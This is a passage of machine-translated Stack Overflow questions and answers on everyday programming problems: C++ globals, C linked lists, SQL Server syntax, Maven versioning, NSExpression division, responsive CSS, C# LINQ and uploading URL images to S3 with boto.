int main()
{   
    WHITENOTES.insert('C');
    WHITENOTES.insert('D');
    WHITENOTES.insert('E');
    WHITENOTES.insert('F');
    WHITENOTES.insert('G');
    WHITENOTES.insert('A');
    WHITENOTES.insert('B');

    // Initialize all positions
    for (int i = 0; i < 12; ++i)
        POSITIONS.insert(i);

    return 0;
} 
```

循环缓冲区.h：

```
#ifndef _CIRCULAR_BUFFER_H
#define _CIRCULAR_BUFFER_H

#include <array>

template < class T, int SIZE> 
class CircularBuffer
{
private:
    int _index;
    int _size;
    std::array<T, SIZE> _buffer;
public:
    CircularBuffer() : _index(0), _size(SIZE), _buffer() {}

    int length ()
    {
        return _size;
    }

    T& at (int index)
    {
        realign(index);
        return _buffer.at(index);
    }

    void insert (T data)
    {
        realign(_index);
        _buffer.at(_index) = data;
        _index += 1;
    }
    int index ()
    {
        return _index;
    }
private:
    int realign (int& index)
    {
        if (index >= _size)
        {
            index -= _size;
            realign(index);
        } else if (index < 0)
        {
            index += _size;
            realign(index);
        }
        return index;
    }
};

#endif 
```

此外，使用[包含防护](http://en.wikipedia.org/wiki/Include_guard)来确保您的文件不会被包含两次。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T06:40:14.200

```
static CB_Natural_T WHITENOTES = CB_Natural_T();
static CB_Chromatic_T POSITIONS = CB_Chromatic_T(); 
```

正是这两个人的行为不像你期望的那样，对吧？由于这些是全局变量，因此您应该输入

```
extern CB_Natural_T WHITENOTES;
extern CB_Chromatic_T POSITIONS; 
```

到头文件中来声明它们并

```
CB_Natural_T WHITENOTES;
CB_Chromatic_T POSITIONS; 
```

到一个 cpp 文件中来实际定义它们。这`static`导致这些对象具有内部链接，因此每个包含标头的文件（准确地说：编译单元）都会创建两个这样的对象，而不是在不同的文件之间共享它们。

我也认为这两个对象是常量，对吧？在这种情况下，您可以这样声明它们。然后，您将需要一个生成这些对象的助手或一个允许初始化的构造函数：

```
CB_Natural_T whitenotes()
{
    CB_Natural_T init;
    ...
    return init;
}
CB_Natural_T const WHITENOTES = whitenotes(); 
```

笔记：

*   如前所述，“= T()”是多余的。
*   模板 SIZE 参数存储在 int 中，这是不必要的，因为该值始终存在。
*   您正在使用一个`realign()`既修改参数又返回结果的函数。我只会使用其中之一。此外，由于它是一个只修改参数而不触及任何成员的函数（见上文！），您可以将其设为静态函数。至少它应该是一个 const 成员函数。

# c++ - 编译共享库时解析 ifdefs

> ID：14346048
> 
> 赞同：0
> 
> 时间：2013-01-15T20:14:00.420
> 
> 标签：c++, c, templates, makefile, shared-libraries

我正在开发一个共享库，其中包含一些包含函数模板的头文件，例如：

```
#ifdef somecompilerflag
#define FUNCTION functionA
#else
#define FUNCTION functionB
#endif

void FUNCTION( ... ); 
```

这`somecompilerflag`是在编译*我的*库时定义的。但是，如果其他人想要链接到这个库，我不希望他们在包含这些头文件时必须拿起我的编译器标志。有没有办法`#ifdefs`在编译库时解决这些问题，以便生成的头文件看起来像：

```
void functionA( ... ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:22:09.150

如果你的目标是 Linux&co，有一个叫做“pkg-config”的东西，它是一个用于检索特定已安装库的编译器和链接器设置的框架。另一种选择是编写一个 sed 脚本将模板头文件转换为正确的版本以进行安装。我什至会在编译库之前这样做，因为这样您就可以确保在编译时使用相同的头文件并且它适合。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:17:23.623

您可以将定义添加到您的 Makefile。你可以在这里查看如何做到这一点：[Passing C/C++ #defines to makefile](https://stackoverflow.com/questions/2039643/passing-c-c-defines-to-makefile)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T21:38:44.750

前面有一个答案暗示了这种方法，如果`somecompilerflag`定义了，则在“编译”头文件（实际上是复制到另一个目录）时插入`#define somecompilerflag`文件顶部。对于makefile，大致如下：

```
ifeq ($(somecompilerflag),-Dsomecompilerflag)
    sed '1 i\#define somecompilerflag' $(header) > headersDir/$(header)
else
    cp $(header) headersDir/$(header)
endif 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-16T04:52:46.367

将您的第一个预处理器指令更改为#ifndef 而不是#ifdef 怎么样？

这样，如果未设置标志，FUNCTION 将解析为 functionA，这听起来像你想要的。

如果您想更进一步并使其他人甚至看不到您的预处理器指令，您可以简单地通过预处理器运行您的代码并将结果输出交给人们。

# sql - 使用 SSMS 中生成的主键脚本的语法错误

> ID：14346049
> 
> 赞同：0
> 
> 时间：2013-01-15T20:14:02.510
> 
> 标签：sql, sql-server, sql-server-2000

我正在尝试将主键从一个数据库（SQL Server 2000）移动到另一个数据库。在原始数据库中，我有一个主键，我使用 SSMS 将其脚本化到一个新的查询窗口：

```
USE [DatabaseName_Test]
GO

ALTER TABLE [dbo].[tbl_itinerary_item] ADD  CONSTRAINT [PK_tbl_itinerary_item] PRIMARY KEY CLUSTERED 
(
    [activity_id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, SORT_IN_TEMPDB = OFF, IGNORE_DUP_KEY = OFF, ONLINE = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
GO 
```

我所做的只是更改数据库：

```
USE [DatabaseName]
GO

ALTER TABLE [dbo].[tbl_itinerary_item] ADD  CONSTRAINT [PK_tbl_itinerary_item] PRIMARY KEY CLUSTERED 
(
    [activity_id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, SORT_IN_TEMPDB = OFF, IGNORE_DUP_KEY = OFF, ONLINE = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
GO 
```

我得到的错误是

> *消息 170，级别 15，状态 1，第 5 行第 5 行：
> '(' 附近的语法不正确。*

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:24:20.490

尝试像这样简化你的sql：

```
ALTER TABLE [dbo].[tbl_itinerary_item] ADD  CONSTRAINT [PK_tbl_itinerary_item] PRIMARY KEY 
(
    [activity_id] ASC
)ON [PRIMARY]
GO 
```

# c - 链表程序崩溃

> ID：14346051
> 
> 赞同：0
> 
> 时间：2013-01-15T20:14:25.350
> 
> 标签：c, linked-list

我正在使用结构实现一个包含 3 个元素的链表。在我介绍计算链表中元素数量的函数之前，它工作正常`Linked_list`。以下是 C 语言程序的代码。

**C**

```
#include <stdlib.h>
#include <stdio.h>

struct node{
    int data;
    struct node* next;
};

struct node* Linked_list();

int Length();

int main()
{
    int length;
    Linked_list();
    length = Length();
    printf("%d", length);
}

struct node* Linked_list() {
    struct node* head = NULL;
    struct node* second = NULL;
    struct node* third = NULL;

    head = malloc(sizeof(struct node));
    second = malloc(sizeof(struct node));
    third = malloc(sizeof(struct node));

    head->data = 1;
    head->next = second;

    second->data = 2;
    second->next = third;

    third->data = 3;
    third->next = NULL;

    printf("%d %d", head->data, second->data);
}

int Length(struct node* head){
    struct node* current = head;
    int count = 0;

    while(current!=NULL)
    {
        count++;
        current = current->next;
    }
    return count;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:16:25.660

您正在声明和调用`Length()`，因为它没有参数`length = Length();`

但是当你定义它时，它确实有一个参数：

```
int Length(struct node* head) 
```

这是合法的，但实际发生的情况是实际函数没有使用`head`参数，这就是它崩溃的原因。

您应该`head`从`Linked_list()`（目前没有返回任何东西）返回并将其提供给`Length()`.

```
struct node* Linked_list() {
    ....

    printf("%d %d", head->data, second->data);
    return  head;
} 
```

然后主要：

```
struct node* head = Linked_list();
length = Length(head); 
```

不过可能还有其他问题。

# java - 逻辑 Maven 版本编号

> ID：14346055
> 
> 赞同：2
> 
> 时间：2013-01-15T20:14:28.980
> 
> 标签：java, maven, version, versioning

Arg，我很确定这是一个简单的，但它伤害了我的大脑，呵呵。我可以从社区获得一些意见吗？

好的..
假设我刚刚发布了 1.2.3 版。

我的下一个发布版本将是 1.2.4。
那么我当前的工作版本是 1.2.3-SNAPSHOT 还是 1.2.4-SNAPSHOT？快照版本号是预发布版本还是发布后版本？它是预发布版本，1.2.4-SNAPSHOT，对吗？

我的下一个*主要*发布版本将是 2.0.0。
这是否意味着我应该制作我的工作副本 2.0.0-SNAPSHOT？或者类似 1.9.9-SNAPSHOT 的东西？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:15:40.157

`1.2.4-SNAPSHOT`.

`1.2.4-snapshot`是“进行中”的默认值。通常（对于大型项目）编号版本是

*   `1.2.4-m1`, `1.2.4-m2`（里程碑构建）
*   `1.2.4-beta1`, `1.2.4-beta2`（测试版）
*   `1.2.4-rc`（发布候选）
*   `1.2.4`（或有时`1.2.4-final`）

在所有这些“大”版本之间，*-snapshots 一直出现（有时一天几次）而没有得到自己的版本。从逻辑上讲，最新的快照会覆盖任何以前的快照（尽管一些 maven 存储库也存储了一些 prev 快照）

# objective-c - NSExpression 1/2

> ID：14346056
> 
> 赞同：2
> 
> 时间：2013-01-15T20:14:33.057
> 
> 标签：objective-c, cocoa, nsexpression

我想计算一个字符串，我正在这样做：

```
NSExpression *expression = [NSExpression expressionWithFormat:calculationString];
float result = [[expression expressionValueWithObject:nil context:nil] floatValue];
NSLog(@"%f", result); 
```

问题是，当计算字符串为 1/2 时，结果为 0。我尝试将 float 与 double 和 NSNumber 以及 %f 更改为 %f 和 %@，但我总是得到 0。我必须更改什么？

另外，如果重要的话，我在欧洲，所以我有逗号而不是这个值的点，但这并不重要，因为我用 %f 记录它，它显示为点。仅供参考

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:24:21.230

基本上，你只需要告诉它你正在执行浮点运算，

```
1.0/2
1.0/2.0
1/2.0 
```

都会工作

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T20:30:02.957

键入`NSExpression`很像在 C 中：看起来像整数（无小数点/逗号）的文字被视为整数，因此使用整数除法。（在整数除法下，1/2*为零*。如果要 0.5，则需要浮点除法。）在解析和评估表达式时会发生这种情况，因此尝试更改结果的类型或输出的格式没有效果——这些事情发生在解析和评估之后。

如果您`calculationString`完全在您的控制之下，那么很容易确保您在需要浮点除法的任何地方使用浮点文字。（也就是说，使用`1.0/2`而不是`1/2`。）如果没有，您将需要更改它，这样它就可以了 - 在这里分解解析`NSExpression`并更改操作数可能比修改字符串更好。

* * *

“分解”位的后续编辑：您知道具有高阶结构的内容中的字符串修改通常是[有问题](https://stackoverflow.com/a/1732454/957768)的。有了`NSExpression`，您已经有了一个解析器（它比简单的正则表达式更聪明）为您分解字符串——这实际上`NSExpression`就是全部内容。

因此，如果您正在使用用户提供的字符串，请不要尝试通过更改字符串来更改表达式。让我们`NSExpression`解析它，然后使用结果对象的属性将其分离成其组成表达式。如果你的字符串只是“1/2”，那么你的表达式有一个由两个组成的数组[`arguments`](https://developer.apple.com/documentation/foundation/nsexpression/1411559-arguments)和函数`"divide:by:"`——你可以用一个等价的函数替换它，其中一个参数显式地是一个浮点值：

```
extension NSExpression {
    var floatifiedForDivisionIfNeeded: NSExpression {
        if function == "divide:by:", let args = arguments, let last = args.last,
          let firstValue = args.first?.constantValue as? NSNumber {
            let newFirst = NSExpression(forConstantValue: firstValue.doubleValue)
            return NSExpression(forFunction: function, arguments: [newFirst, last])
        } else {
            return self
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-05-19T05:15:57.307

我认为您需要 User [DDMathParser](https://github.com/davedelong/DDMathParser)在这种情况下最好。我在我的一个项目中使用了它，该项目面临与您遇到的相同问题

`DDMathEvaluator *eval = [DDMathEvaluator defaultMathEvaluator]; id value=[eval evaluateString:@"1/2" withSubstitutions:nil error:&error]; NSLog(@"Result %@",value); Result 0.5`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-10-05T07:41:14.140

对于仍然有这个问题的人，我做了一个快速修复：

```
extension String {
    var mathExpression: String {
        var returnValue = ""
        for value in newString.components(separatedBy: " ") {
            if value.isOperator {
                returnValue += value
            } else {
                returnValue += "\(Double(value) ?? 0)"
            }
        }

        return returnValue
    }

    var isOperator: Bool {
        ["+", "-", "/", "x", "*"].contains(self)
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-07-07T06:52:29.867

Rickster 的解决方案有效，但在表达式方面存在问题`5*5/2`，其中第一个参数（此处`5*5`）不仅仅是一个数字。

我在这里找到了一个适合我的不同解决方案：[https ://stackoverflow.com/a/46554342/6385925](https://stackoverflow.com/a/46554342/6385925)

# ruby-on-rails - Rails / Devise / ActiveAdmin：访问 active_admin 选项卡时出现问题

> ID：14346060
> 
> 赞同：1
> 
> 时间：2013-01-15T20:14:49.993
> 
> 标签：ruby-on-rails, ruby, devise, stack, activeadmin

我正在使用`devise`并且`active_admin`每当我访问 localhost:3000/admin 并选择`Users`或`Admin Users`选项卡时，rails 崩溃并带有很长的跟踪：

```
... ... ...
b77ae000-b77af000 r-xp 00000000 00:00 0          [vdso]
b77af000-b77ca000 r-xp 00000000 08:01 374939     /lib/ld-2.11.3.so
b77ca000-b77cb000 r--p 0001b000 08:01 374939     /lib/ld-2.11.3.so
b77cb000-b77cc000 rw-p 0001c000 08:01 374939     /lib/ld-2.11.3.so
bfd8b000-bfda0000 rw-p 00000000 00:00 0          [stack]
[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html
Aborted 
```

以下是`routes.rb`和的内容`app/admin/users.rb`。

```
# config/routes.rb
... ... ... 
ActiveAdmin.routes(self)
devise_for :admin_users, ActiveAdmin::Devise.config
devise_for :users
...

# app/admin/users.rb
ActiveAdmin.register User do
end

# app/models/user.rb
class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable, :lockable, :timeoutable,
         :recoverable, :rememberable, :trackable, :validatable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :name, :email, :password, :password_confirmation, :remember_me
end 
```

红宝石版本：`ruby 1.9.3p362 (2012-12-25 revision 38607) [i686-linux]`

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:08:38.577

ruby 解释器中的错误。安装 1.9.3-p327。

[https://github.com/gitlabhq/gitlabhq/issues/2436](https://github.com/gitlabhq/gitlabhq/issues/2436)

# multithreading - 如何为 Cocoa 中的每个线程创建单例？

> ID：14346061
> 
> 赞同：0
> 
> 时间：2013-01-15T20:14:50.307
> 
> 标签：multithreading, cocoa, singleton

是否有任何通用模式可以为每个线程创建单例对象？

当我向`sharedInstance`单例类发送消息时，我希望有一个仅用于`currentThread`.

谢谢

编辑：我发现这篇文章非常有用[http://ddeville.me/2011/02/creating-shared-instances-of-non-thread-safe-classes/](http://ddeville.me/2011/02/creating-shared-instances-of-non-thread-safe-classes/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:23:02.740

每个线程要求一个单例和一个对象是矛盾的。
你可能想要一个`thread local`对象。那是每个线程特定的一个对象。

线程本地对象可以通过使用来实现，`[NSThread threadDictionary].`
你可以存储这样一个对象，`NSValue`它甚至可以保存一个指针。

# css - 使用 CSS 的流畅布局

> ID：14346062
> 
> 赞同：0
> 
> 时间：2013-01-15T20:14:50.467
> 
> 标签：css, fluid-layout, liquid-layout

我有一个页面，其中有 10 个 div 作为大按钮，显示在 2 行，每行 5 个，但我希望这样，如果页面调整大小或在屏幕较小的设备上打开，按钮的布局会自动更改但我不知道该怎么做。

我应该从哪里开始寻找，或者有人知道任何可以帮助我实现这一目标的好教程吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:18:14.387

它的名称是响应式（或响应式）设计。你可以在这里找到一个不错的介绍：http: [//netuncovered.com/2011/05/reactive-web-design/](http://netuncovered.com/2011/05/reactive-web-design/)

这一切都归结为 CSS 中的 @media 查询，以确定您正在处理的窗口的大小，并相应地更改样式。就像是：

```
@media screen and (min-width:768px)
{
    .my_div { width: 200px; }
}
@media screen and (min-width:1024px)
{
    .my_div { width: 300px; }
} 
```

此示例根据窗口大小为您提供不同大小的 div。您可以使用 @media 查询根据屏幕大小执行相同的 w/ 定位或任何其他 CSS 规则。

对于如何更改连续项目数的具体问题，假设您有以下 HTML：

```
<div class="item"></div>
<div class="item"></div>
<div class="item"></div>
<div class="clear3"></div>
<div class="item"></div>
<div class="item"></div>
<div class="clear5"></div>
<div class="item"></div>
<div class="clear3"></div>
<div class="item"></div>
<div class="item"></div>
<div class="item"></div>
<div class="clear3"></div>
<div class="item"></div> 
```

您可以根据视口的大小指定 .clear3 或 .clear5 类何时*真正*清除浮动。就像是：

```
.item { float: left; width: 200px; }
@media screen and (min-width:768px)
{
    .clear3 { clear: both; }
    .clear5 { clear: none; }
}
@media screen and (min-width:1024px)
{
    .clear3 { clear: none; }
    .clear5 { clear: both; }
} 
```

这将根据屏幕大小更改每行 .item div 的 div 数。我认为。我并没有真正测试它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T20:19:41.830

响应式设计：我就是这样学的——

付费但完全值得： http: [//www.codeschool.com/courses/journey-into-mobile](http://www.codeschool.com/courses/journey-into-mobile)

输入 Twiiter Bootstap 响应部分以了解它们的工作方式，我在这方面学到了很多： [https ://github.com/twitter/bootstrap/blob/master/less/responsive-768px-979px.less](https://github.com/twitter/bootstrap/blob/master/less/responsive-768px-979px.less)

您需要熟悉媒体查询：

[https://developer.mozilla.org/en-US/docs/CSS/@media](https://developer.mozilla.org/en-US/docs/CSS/@media)

有响应页面大小的最小宽度和最大宽度助手。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T20:27:45.470

关于如何开始响应式设计的优秀文章：

[http://www.onextrapixel.com/2012/04/23/responsive-web-design-layouts-and-media-queries/](http://www.onextrapixel.com/2012/04/23/responsive-web-design-layouts-and-media-queries/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T20:31:50.723

这可以在没有任何媒体查询的情况下完成

```
<div id="wrapper">
    <div>1</div>
    <div>2</div>
    <div>3</div>
    <div>4</div>
    <div>5</div>
    <div>6</div>
    <div>7</div>
    <div>8</div>
    <div>9</div>
    <div>10</div>
</div> 
```

CSS：

```
#wrapper { max-width: 750px; overflow: hidden; border: 1px solid #000; margin: 50px auto; }
#wrapper div { width: 150px; height: 150px; float: left; } 
```

# c# - 从列表中的每个元组中获取特定项目

> ID：14346064
> 
> 赞同：17
> 
> 时间：2013-01-15T20:14:54.817
> 
> 标签：c#, string, list, tuples

创建一个列表的正确方法是什么，比如`Tuple`a `List`of中每个的第一项`Tuples`？

如果我有一个`List<Tuple<string,string>>`，我将如何获得`List<string>`每个字符串中的第一个字符串`Tuple`？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-01-15T20:15:57.197

一点 Linq 就可以解决问题：

```
var myStringList = myTupleList.Select(t=>t.Item1).ToList(); 
```

作为解释，由于 Tim 发布了几乎相同的答案，因此 Select() 创建了一个 1:1 的“投影”；它接受 Enumerable 的每个输入元素，并为每个输入元素计算 lambda 表达式并将结果作为具有相同数量元素的新 Enumerable 的元素返回。然后 ToList() 将遍历 Select() 生成的 Enumerable，并一次将每个元素添加到一个新`List<T>`实例中。

Tim 对内存效率有很好的看法。ToList() 将创建一个列表并一次添加一个元素，这将导致 List 不断调整其底层数组的大小，每次将其加倍以确保其具有适当的容量。对于一个大列表，这可能会导致 OutOfMemoryExceptions，并且它将导致 CLR 为列表分配比必要更多的内存，除非元素的数量恰好是 2 的幂。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-15T20:15:43.673

```
List<string> list = tuples.Select(t => t.Item1).ToList(); 
```

或者，可能更便宜的内存：

```
List<string> list = new List<String>(tuples.Count);
list.AddRange(tuples.Select(t => t.Item1)); 
```

因为它避免了`List.Add`in的加倍算法`ToList`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T20:17:41.880

如果您有`List<Tuple<string, string>> listoftuples`，您可以使用 List 的 Select 方法实现从每个元组中获取第一个字符串。

它看起来像这样：

```
List<string> firstelements = listoftuples.Select(t => t.Item1).ToList(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-10-31T15:58:24.680

通用变量：用于选择集合元组长度未知的特定项目，即 2,3,4 ...：

```
 static IEnumerable TupleListSelectQuery<T>(IEnumerable<T> lst, int index) where T : IStructuralEquatable, IStructuralComparable, IComparable
    {
        return lst.Select(t => typeof(T).GetProperty("Item" + Convert.ToString(itemNumber)).GetValue(t)).ToList();
    } 
```

其中*index*的值对应于元组的枚举方式，即 1,2,3 ...（不是 0,1,2 ...）。

# python - 使用 boto 将公共 URL 上可用的图像上传到 S3

> ID：14346065
> 
> 赞同：48
> 
> 时间：2013-01-15T20:14:55.037
> 
> 标签：python, django, amazon-s3, boto

我在 Python Web 环境中工作，我可以使用 boto 的 key.set_contents_from_filename(path/to/file) 简单地将文件从文件系统上传到 S3。但是，我想上传一张已经在网上的图片（比如[https://pbs.twimg.com/media/A9h_htACIAAaCf6.jpg:large](https://pbs.twimg.com/media/A9h_htACIAAaCf6.jpg:large)）。

我是否应该以某种方式将图像下载到文件系统，然后像往常一样使用 boto 将其上传到 S3，然后删除图像？

理想的情况是，如果有一种方法可以获取 boto 的 key.set_contents_from_file 或其他可以接受 URL 并将图像很好地流式传输到 S3 而无需将文件副本显式下载到我的服务器的命令。

```
def upload(url):
    try:
        conn = boto.connect_s3(settings.AWS_ACCESS_KEY_ID, settings.AWS_SECRET_ACCESS_KEY)
        bucket_name = settings.AWS_STORAGE_BUCKET_NAME
        bucket = conn.get_bucket(bucket_name)
        k = Key(bucket)
        k.key = "test"
        k.set_contents_from_file(url)
        k.make_public()
                return "Success?"
    except Exception, e:
            return e 
```

如上所述，使用 set_contents_from_file，我得到“字符串对象没有属性 'tell'”错误。将 set_contents_from_filename 与 url 一起使用，我得到一个 No such file or directory 错误。[boto 存储文档](http://boto.cloudhackers.com/en/latest/s3_tut.html#storing-data)没有提到上传本地文件，也没有提到上传远程存储的文件。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2018-08-09T02:41:40.653

这是我使用[requests](http://docs.python-requests.org/en/master/user/quickstart/)的方法，关键是`stream=True`在最初发出请求时设置，并使用该`upload.fileobj()`方法上传到 s3：

```
import requests
import boto3

url = "https://upload.wikimedia.org/wikipedia/en/a/a9/Example.jpg"
r = requests.get(url, stream=True)

session = boto3.Session()
s3 = session.resource('s3')

bucket_name = 'your-bucket-name'
key = 'your-key-name' # key is the name of file on your bucket

bucket = s3.Bucket(bucket_name)
bucket.upload_fileobj(r.raw, key) 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-01-15T21:26:00.777

好的，从@garnaat 看来，S3 目前不允许通过 url 上传。我设法通过仅将远程图像读入内存来将它们上传到 S3。这行得通。

```
def upload(url):
    try:
        conn = boto.connect_s3(settings.AWS_ACCESS_KEY_ID, settings.AWS_SECRET_ACCESS_KEY)
        bucket_name = settings.AWS_STORAGE_BUCKET_NAME
        bucket = conn.get_bucket(bucket_name)
        k = Key(bucket)
        k.key = url.split('/')[::-1][0]    # In my situation, ids at the end are unique
        file_object = urllib2.urlopen(url)           # 'Like' a file object
        fp = StringIO.StringIO(file_object.read())   # Wrap object    
        k.set_contents_from_file(fp)
        return "Success"
    except Exception, e:
        return e 
```

还要感谢[如何从 urllib.urlopen() 返回的“类文件对象”创建 GzipFile 实例？](https://stackoverflow.com/questions/4204604/how-can-i-create-a-gzipfile-instance-from-the-file-like-object-that-urllib-url)

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2017-02-27T18:26:18.080

对于使用官方“boto3”包（而不是原始答案中的旧“boto”包）的这个问题的 2017 年相关答案：

蟒蛇 3.5

如果您使用的是干净的 Python 安装，请先 pip 安装这两个软件包：

`pip install boto3`

`pip install requests`

```
import boto3
import requests

# Uses the creds in ~/.aws/credentials
s3 = boto3.resource('s3')
bucket_name_to_upload_image_to = 'photos'
s3_image_filename = 'test_s3_image.png'
internet_image_url = 'https://docs.python.org/3.7/_static/py.png'

# Do this as a quick and easy check to make sure your S3 access is OK
for bucket in s3.buckets.all():
    if bucket.name == bucket_name_to_upload_image_to:
        print('Good to go. Found the bucket to upload the image into.')
        good_to_go = True

if not good_to_go:
    print('Not seeing your s3 bucket, might want to double check permissions in IAM')

# Given an Internet-accessible URL, download the image and upload it to S3,
# without needing to persist the image to disk locally
req_for_image = requests.get(internet_image_url, stream=True)
file_object_from_req = req_for_image.raw
req_data = file_object_from_req.read()

# Do the actual upload to s3
s3.Bucket(bucket_name_to_upload_image_to).put_object(Key=s3_image_filename, Body=req_data) 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2013-01-15T20:24:27.803

不幸的是，真的没有办法做到这一点。至少目前不是。我们可以向 boto 添加一个方法，例如`set_contents_from_url`，但该方法仍然需要将文件下载到本地计算机然后上传。它可能仍然是一种方便的方法，但它不会为您节省任何东西。

为了做您真正想做的事情，我们需要在 S3 服务本身上有一些功能，允许我们将 URL 传递给它，并让它为我们将 URL 存储到存储桶中。这听起来像是一个非常有用的功能。您可能希望将其发布到 S3 论坛。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2018-11-20T21:47:20.347

一个简单的 3 行实现，适用于开箱即用的 lambda：

```
import boto3
import requests

s3_object = boto3.resource('s3').Object(bucket_name, object_key)

with requests.get(url, stream=True) as r:
    s3_object.put(Body=r.content) 
```

该`.get`部分的来源直接来自[`requests`文档](http://docs.python-requests.org/en/master/user/advanced/#body-content-workflow)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2018-02-25T22:16:53.223

我已经尝试使用 boto3 进行以下操作，它对我有用：

```
import boto3;
import contextlib;
import requests;
from io import BytesIO;

s3 = boto3.resource('s3');
s3Client = boto3.client('s3')
for bucket in s3.buckets.all():
  print(bucket.name)

url = "@resource url";
with contextlib.closing(requests.get(url, stream=True, verify=False)) as response:
        # Set up file stream from response content.
        fp = BytesIO(response.content)
        # Upload data to S3
        s3Client.upload_fileobj(fp, 'aws-books', 'reviews_Electronics_5.json.gz') 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2021-04-07T14:10:04.613

```
from io import BytesIO
def send_image_to_s3(url, name):
    print("sending image")
    bucket_name = 'XXX'
    AWS_SECRET_ACCESS_KEY = "XXX"
    AWS_ACCESS_KEY_ID = "XXX"

    s3 = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY_ID,
                      aws_secret_access_key=AWS_SECRET_ACCESS_KEY)

    response = requests.get(url)
    img = BytesIO(response.content)

    file_name = f'path/{name}'
    print('sending {}'.format(file_name))
    r = s3.upload_fileobj(img, bucket_name, file_name)

    s3_path = 'path/' + name
    return s3_path 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2019-09-18T18:33:12.647

到目前为止，S3 似乎不支持远程上传。您可以使用以下类将图像上传到 S3。这里的上传方法首先尝试下载图像并将其保存在内存中一段时间​​，直到它被上传。为了能够连接到 S3，您必须使用命令安装 AWS CLI `pip install awscli`，然后使用命令输入一些凭证`aws configure`：

```
import urllib3
import uuid
from pathlib import Path
from io import BytesIO
from errors import custom_exceptions as cex

BUCKET_NAME = "xxx.yyy.zzz"
POSTERS_BASE_PATH = "assets/wallcontent"
CLOUDFRONT_BASE_URL = "https://xxx.cloudfront.net/"

class S3(object):
    def __init__(self):
        self.client = boto3.client('s3')
        self.bucket_name = BUCKET_NAME
        self.posters_base_path = POSTERS_BASE_PATH

    def __download_image(self, url):
        manager = urllib3.PoolManager()
        try:
            res = manager.request('GET', url)
        except Exception:
            print("Could not download the image from URL: ", url)
            raise cex.ImageDownloadFailed
        return BytesIO(res.data)  # any file-like object that implements read()

    def upload_image(self, url):
        try:
            image_file = self.__download_image(url)
        except cex.ImageDownloadFailed:
            raise cex.ImageUploadFailed

        extension = Path(url).suffix
        id = uuid.uuid1().hex + extension
        final_path = self.posters_base_path + "/" + id
        try:
            self.client.upload_fileobj(image_file,
                                       self.bucket_name,
                                       final_path
                                       )
        except Exception:
            print("Image Upload Error for URL: ", url)
            raise cex.ImageUploadFailed

        return CLOUDFRONT_BASE_URL + id 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2018-02-16T12:55:01.470

使用 boto3`upload_fileobj`方法，您可以将文件流式传输到 S3 存储桶，而无需保存到磁盘。这是我的功能：

```
import boto3
import StringIO
import contextlib
import requests

def upload(url):
    # Get the service client
    s3 = boto3.client('s3')

    # Rember to se stream = True.
    with contextlib.closing(requests.get(url, stream=True, verify=False)) as response:
        # Set up file stream from response content.
        fp = StringIO.StringIO(response.content)
        # Upload data to S3
        s3.upload_fileobj(fp, 'my-bucket', 'my-dir/' + url.split('/')[-1]) 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2018-03-01T13:53:42.427

```
import boto
from boto.s3.key import Key
from boto.s3.connection import OrdinaryCallingFormat
from urllib import urlopen

def upload_images_s3(img_url):
    try:
        connection = boto.connect_s3('access_key', 'secret_key', calling_format=OrdinaryCallingFormat())       
        bucket = connection.get_bucket('boto-demo-1519388451')
        file_obj = Key(bucket)
        file_obj.key = img_url.split('/')[::-1][0]
        fp = urlopen(img_url)
        result = file_obj.set_contents_from_string(fp.read())
    except Exception, e:
        return e 
```

# ios - 核心数据父子实体

> ID：14346071
> 
> 赞同：1
> 
> 时间：2013-01-15T20:15:19.907
> 
> 标签：ios, objective-c, core-data

